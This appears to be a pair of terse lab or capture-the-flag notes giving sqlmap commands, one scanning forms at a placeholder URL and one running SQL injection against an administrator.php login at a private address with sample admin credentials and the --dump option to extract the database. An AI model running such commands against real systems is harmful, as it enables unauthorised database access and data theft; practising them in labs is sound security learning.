sqlmap -u url --forms
sqlmap -u http://10.10.33.24/administrator.php --dump --data="username=admin&password=admin" 